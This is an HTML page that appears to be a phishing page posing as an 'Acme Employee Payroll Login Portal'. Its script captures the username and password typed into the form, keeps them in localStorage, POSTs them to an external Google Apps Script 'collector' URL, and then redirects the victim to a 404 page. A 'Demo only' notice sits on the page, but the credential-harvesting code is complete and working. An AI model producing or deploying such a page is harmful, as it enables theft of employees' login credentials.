<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Acme Employee Payroll Login Portal</title>
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial;margin:40px}
    .card{max-width:420px;margin:0 auto;padding:24px;border:1px solid #ddd;border-radius:8px}
    input{display:block;width:100%;padding:8px;margin:8px 0}
    button{padding:10px 14px}
    .small{font-size:12px;color:#666;margin-top:12px}
    .status{font-size:13px;margin-top:10px}
  </style>
</head>
<body>
  <div class="card">
    <h2>Acme Employee Payroll Login Portal</h2>

    <form id="loginForm" method="post" action="#" autocomplete="off" novalidate>
      <label>
        Username
        <input id="username" name="username" type="text" placeholder="Username" required>
      </label>
      <label>
        Password
        <input id="password" name="password" type="password" placeholder="Password" required>
      </label>

      <div style="margin-top:12px">
        <button type="submit">Sign in</button>
      </div>

      <p class="small">Demo only. Do NOT use real credentials!</p>

      <div id="status" class="status" aria-live="polite" style="display:none"></div>
    </form>
  </div>

  <script>
    (function(){
      // Your deployed Google Apps Script Web App URL
      const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyo7bJPYlTfHDb_LyLTcU-rOkvwqjXStOLPega-66w0T8l6hwbVAiqse1_4e84xbuQ8/exec';

      const STORAGE_KEY = 'demo_game_creds';

      function saveToLocal(username, password){
        try {
          const prev = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
          prev.push({username: username, password: password, ts: new Date().toISOString()});
          const trimmed = prev.slice(-200);
          localStorage.setItem(STORAGE_KEY, JSON.stringify(trimmed));
        } catch(e) {
          console.warn('Could not save to localStorage', e);
        }
      }

      function postToCollector(formEl){
        if (!WEB_APP_URL){
          return Promise.resolve({ok:false, reason:'no-web-app-configured'});
        }

        const fd = new FormData(formEl);

        return fetch(WEB_APP_URL, {
          method: 'POST',
          body: fd,
        }).then(resp => {
          return resp.text().then(text => {
            try { return {ok: resp.ok, status: resp.status, text: text}; }
            catch(e){ return {ok: resp.ok, status: resp.status, text: text}; }
          });
        }).catch(err => {
          return {ok:false, reason: String(err)};
        });
      }

      function showStatus(msg, timeoutMs){
        const el = document.getElementById('status');
        el.style.display = 'block';
        el.textContent = msg;
        if (timeoutMs) setTimeout(()=>{ el.style.display = 'none'; }, timeoutMs);
      }

      document.getElementById('loginForm').addEventListener('submit', function(evt){
        evt.preventDefault();

        const form = evt.target;
        const username = form.username.value;
        const password = form.password.value;

        // Save locally
        saveToLocal(username, password);

        // Show status while posting
        showStatus('Submitting (demo)...', 4000);

        // POST to Apps Script
        postToCollector(form).then(result => {
          console.debug('Collector result:', result);
          if (result && result.ok) {
            showStatus('Submitted to collector (demo). Redirecting…', 800);
          } else {
            showStatus('Collector not reachable or not configured. Redirecting…', 800);
          }
        });

        // Redirect to 404 after small delay
        setTimeout(function(){
          window.location.href = '404.html';
        }, 700);
      });
    })();
  </script>
</body>
</html>
